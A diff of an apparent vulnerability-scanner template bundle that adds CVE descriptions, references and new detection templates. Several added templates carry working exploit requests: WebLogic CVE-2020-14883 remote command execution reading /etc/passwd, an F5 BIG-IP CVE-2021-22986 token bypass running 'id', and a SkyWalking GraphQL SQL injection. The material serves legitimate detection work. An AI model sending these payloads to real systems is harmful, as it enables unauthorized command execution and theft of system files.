@@ -4963,8 +4963,9 @@
       "id": "CVE-2020-10547",
       "info": {
         "author": "madrobot",
+        "description": "rConfig 3.9.4 and previous versions has unauthenticated compliancepolicyelements.inc.php SQL injection. Because, by default, nodes' passwords are stored in cleartext, this vulnerability leads to lateral movement, granting an attacker access to monitored network devices.",
         "name": "rConfig 3.9.4 SQLi",
-        "reference": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10547",
+        "reference": "https://github.com/theguly/exploits/blob/master/CVE-2020-10547.py https://theguly.github.io/2020/09/rconfig-3.9.4-multiple-vulnerabilities/",
         "severity": "high",
         "tags": "cve,cve2020,rconfig,sqli"
       },
@@ -5065,6 +5066,7 @@
       "id": "CVE-2020-11034",
       "info": {
         "author": "pikpikcu",
+        "description": "In GLPI before version 9.4.6, there is a vulnerability that allows bypassing the open redirect protection based which is based on a regexp. This is fixed in version 9.4.6.",
         "name": "GLPI v.9.4.6 - Open redirect",
         "reference": "- https://github.com/glpi-project/glpi/security/advisories/GHSA-gxv6-xq9q-37hg\n- https://github.com/glpi-project/glpi/archive/9.4.6.zip\n- https://nvd.nist.gov/vuln/detail/CVE-2020-11034\n",
         "severity": "low",
@@ -5855,6 +5857,46 @@
           },
           "raw": [
             "POST /console/images/%252e%252e%252fconsole.portal HTTP/1.1\nHost: {{Hostname}}\ncmd: §exec§\nConnection: close\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\n\n_nfpb=false&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession%28%22var%20m%20%3D%20java.lang.Class.forName%28%22weblogic.work.ExecuteThread%22%29.getDeclaredMethod%28%22getCurrentWork%22%29%3B%20var%20currThread%20%3D%20java.lang.Thread.currentThread%28%29%3B%20var%20currWork%20%3D%20m.invoke%28currThread%29%3B%20var%20f2%20%3D%20currWork.getClass%28%29.getDeclaredField%28%22connectionHandler%22%29%3B%20f2.setAccessible%28true%29%3B%20var%20connectionHandler%20%3D%20f2.get%28currWork%29%3B%20var%20f3%20%3D%20connectionHandler.getClass%28%29.getDeclaredField%28%22request%22%29%3B%20f3.setAccessible%28true%29%3B%20var%20request%20%3D%20f3.get%28connectionHandler%29%3B%20var%20command%20%3D%20request.getHeader%28%22cmd%22%29%3B%20var%20response%20%3D%20request.getResponse%28%29%3B%20var%20isWin%20%3D%20java.lang.System.getProperty%28%22os.name%22%29.toLowerCase%28%29.contains%28%22win%22%29%3B%20var%20listCmd%20%3D%20new%20java.util.ArrayList%28%29%3B%20var%20p%20%3D%20new%20java.lang.ProcessBuilder%28%22%22%29%3B%20if%28isWin%29%7Bp.command%28%22cmd.exe%22%2C%20%22%2Fc%22%2C%20command%29%3B%20%7Delse%7Bp.command%28%22%2Fbin%2Fbash%22%2C%20%22-c%22%2C%20command%29%3B%20%7D%20p.redirectErrorStream%28true%29%3B%20var%20process%20%3D%20p.start%28%29%3B%20var%20output%20%3D%20process.getInputStream%28%29%3B%20var%20scanner%20%3D%20new%20java.util.Scanner%28output%29.useDelimiter%28%22%5C%5C%5C%5CA%22%29%3B%20var%20out%20%3D%20scanner.next%28%29%3B%20var%20outputStream%20%3D%20response.getServletOutputStream%28%29%3B%20outputStream.write%28out.getBytes%28%29%29%3B%20outputStream.flush%28%29%3B%20response.getWriter%28%29.write%28%22%22%29%3B%20currThread.interrupt%28%29%3B%22%29\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-14883",
+      "info": {
+        "author": "pdteam",
+        "description": "Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware. Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0. Easily exploitable vulnerability allows high privileged attacker with network access via HTTP to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server.",
+        "name": "Oracle WebLogic Server Administration Console Handle RCE",
+        "reference": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14883",
+        "severity": "critical",
+        "tags": "cve,cve2020,oracle,rce,weblogic"
+      },
+      "requests": [
+        {
+          "body": "test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(\"connectionHandler\");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(\"getServletRequest\").invoke(obj); String cmd = req.getHeader(\"Test-Header\");String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(\"\\\\A\").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(\"getResponse\").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')\n",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Test-Header": "cat /etc/passwd"
+          },
+          "matchers": [
+            {
+              "condition": "and",
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/console/images/%252e%252e%252fconsole.portal"
           ]
         }
       ]
@@ -7388,8 +7430,9 @@
       "id": "CVE-2020-4463",
       "info": {
         "author": "dwisiswant0",
-        "description": "IBM Maximo Asset Management is vulnerable to an\nXML External Entity Injection (XXE) attack when processing XML data.\nA remote attacker could exploit this vulnerability to expose\nsensitive information or consume memory resources.\n\nReferences:\n- https://www.ibm.com/support/pages/security-bulletin-ibm-maximo-asset-management-vulnerable-information-disclosure-cve-2020-4463\n- https://github.com/Ibonok/CVE-2020-4463\n",
+        "description": "IBM Maximo Asset Management is vulnerable to an\nXML External Entity Injection (XXE) attack when processing XML data.\nA remote attacker could exploit this vulnerability to expose\nsensitive information or consume memory resources.\n",
         "name": "IBM Maximo Asset Management Information Disclosure via XXE",
+        "references": "- https://www.ibm.com/support/pages/security-bulletin-ibm-maximo-asset-management-vulnerable-information-disclosure-cve-2020-4463\n- https://github.com/Ibonok/CVE-2020-4463\n",
         "severity": "high",
         "tags": "cve,cve2020,ibm,xxe"
       },
@@ -7429,7 +7472,9 @@
       "id": "CVE-2020-5284",
       "info": {
         "author": "Harsh & Rahul & dwisiswant0",
+        "description": "Next.js versions before 9.3.2 have a directory traversal vulnerability. Attackers could craft special requests to access files in the dist directory (.next). This does not affect files outside of the dist directory (.next). In general, the dist directory only holds build assets unless your application intentionally stores other assets under this directory. This issue is fixed in version 9.3.2.",
         "name": "Next.js .next/ limited path traversal",
+        "reference": "https://github.com/zeit/next.js/releases/tag/v9.3.2 https://github.com/zeit/next.js/security/advisories/GHSA-fq77-7p7r-83rj",
         "severity": "medium",
         "tags": "cve,cve2020,nextjs,lfi"
       },
@@ -7504,7 +7549,9 @@
       "id": "CVE-2020-5410",
       "info": {
         "author": "mavericknerd",
+        "description": "Spring Cloud Config, versions 2.2.x prior to 2.2.3, versions 2.1.x prior to 2.1.9, and older unsupported versions allow applications to serve arbitrary configuration files through the spring-cloud-config-server module. A malicious user, or attacker, can send a request using a specially crafted URL that can lead to a directory traversal attack.",
         "name": "Directory Traversal in Spring Cloud Config Server",
+        "reference": "https://tanzu.vmware.com/security/cve-2020-5410",
         "severity": "high",
         "tags": "cve,cve2020,lfi,springcloud"
       },
@@ -7539,6 +7586,7 @@
         "author": "dwisiswant0",
         "description": "Spring Cloud Netflix, versions 2.2.x prior to 2.2.4, versions 2.1.x prior to 2.1.6, and older unsupported versions allow applications to use the Hystrix Dashboard proxy.stream endpoint to make requests to any server reachable by the server hosting the dashboard. A malicious user, or attacker, can send a request to other servers that should not be exposed publicly.",
         "name": "Full-read SSRF in Spring Cloud Netflix (Hystrix Dashboard)",
+        "reference": "https://tanzu.vmware.com/security/cve-2020-5412",
         "severity": "medium",
         "tags": "cve,cve2020,ssrf,springcloud"
       },
@@ -8303,8 +8351,9 @@
       "id": "CVE-2020-9047",
       "info": {
         "author": "dwisiswant0",
-        "description": "This template supports the detection part only. See references.\n\nA vulnerability exists that could allow the execution of\nunauthorized code or operating system commands on systems\nrunning exacqVision Web Service versions 20.06.3.0 and prior\nand exacqVision Enterprise Manager versions 20.06.4.0 and prior.\n\nAn attacker with administrative privileges could potentially\ndownload and run a malicious executable that\ncould allow OS command injection on the system.\n\nSource/References:\n- https://github.com/norrismw/CVE-2020-9047\n",
+        "description": "This template supports the detection part only. See references.\n\nA vulnerability exists that could allow the execution of\nunauthorized code or operating system commands on systems\nrunning exacqVision Web Service versions 20.06.3.0 and prior\nand exacqVision Enterprise Manager versions 20.06.4.0 and prior.\n\nAn attacker with administrative privileges could potentially\ndownload and run a malicious executable that\ncould allow OS command injection on the system.\n",
         "name": "exacqVision Web Service RCE",
+        "reference": "- https://github.com/norrismw/CVE-2020-9047\n- https://www.johnsoncontrols.com/cyber-solutions/security-advisories\n- https://www.us-cert.gov/ics/advisories/ICSA-20-170-01\n",
         "severity": "high",
         "tags": "cve,cve2020,rce"
       },
@@ -8480,6 +8529,53 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/settings.php"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-9483",
+      "info": {
+        "author": "pikpikcu",
+        "name": "SkyWalking SQLI",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-9483",
+        "severity": "high",
+        "tags": "cve,cve2020,sqli,skywalking"
+      },
+      "requests": [
+        {
+          "body": "{\"query\":\"query SQLi($d: Duration!){globalP99:getLinearIntValues(metric: {name:\\\"all_p99\\\",id:\\\"') UNION SELECT 1,CONCAT('~','9999999999','~')-- \\\",}, duration: $d){values{value}}}\",\"variables\":{\"d\":{\"start\":\"2021-11-11\",\"end\":\"2021-11-12\",\"step\":\"DAY\"}}}\n",
+          "headers": {
+            "Content-Type": "application/json"
+          },
+          "matchers": [
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "Content-Type: application/json"
+              ]
+            },
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "UNION SELECT 1,CONCAT('~','9999999999','~')--",
+                "Exception while fetching data"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/graphql"
           ]
         }
       ]
@@ -8842,6 +8938,56 @@
             "{{BaseURL}}/www/delivery/lg.php?dest=http://example.com"
           ],
           "redirects": true
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-22986",
+      "info": {
+        "advisory": "https://support.f5.com/csp/article/K03009991",
+        "author": "Harsh Jaiswal (@rootxharsh) & Rahul Maini (@iamnoooob)",
+        "description": "The iControl REST interface has an unauthenticated remote command execution vulnerability.",
+        "name": "F5 BIG-IP iControl REST unauthenticated RCE",
+        "reference": "https://attackerkb.com/topics/J6pWeg5saG/k03009991-icontrol-rest-unauthenticated-remote-command-execution-vulnerability-cve-2021-22986",
+        "severity": "critical",
+        "tags": "bigip,cve,cve2021,rce"
+      },
+      "requests": [
+        {
+          "extractors": [
+            {
+              "group": 1,
+              "internal": true,
+              "name": "token",
+              "part": "body",
+              "regex": [
+                "([A-Z0-9]{26})"
+              ],
+              "type": "regex"
+            },
+            {
+              "group": 1,
+              "part": "body",
+              "regex": [
+                "\"commandResult\":\"(.*)\""
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers": [
+            {
+              "condition": "and",
+              "type": "word",
+              "words": [
+                "commandResult",
+                "uid="
+              ]
+            }
+          ],
+          "raw": [
+            "POST /mgmt/shared/authn/login HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en\nAuthorization: Basic YWRtaW46\nContent-Type: application/json\nCookie: BIGIPAuthCookie=1234\nConnection: close\n\n{\"username\":\"admin\",\"userReference\":{},\"loginReference\":{\"link\":\"http://localhost/mgmt/shared/gossip\"}}\n",
+            "POST /mgmt/tm/util/bash HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en\nX-F5-Auth-Token: §token§\nContent-Type: application/json\nConnection: close\n\n{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}\n"
+          ]
         }
       ]
     },
